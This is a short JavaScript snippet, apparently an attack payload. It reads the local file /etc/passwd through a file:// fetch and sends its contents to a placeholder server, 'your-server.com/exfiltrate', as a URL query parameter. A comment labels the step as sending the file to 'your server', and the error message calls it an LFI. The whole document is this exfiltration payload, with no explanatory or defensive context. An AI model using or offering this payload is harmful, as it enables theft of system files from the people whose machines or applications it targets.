fetch('file:///etc/passwd')
  .then(response => response.text())
  .then(text => {
    fetch('https://your-server.com/exfiltrate?data=' + encodeURIComponent(text));  // Send file content to your server
  })
  .catch(error => alert('LFI Failed: ' + error.message));
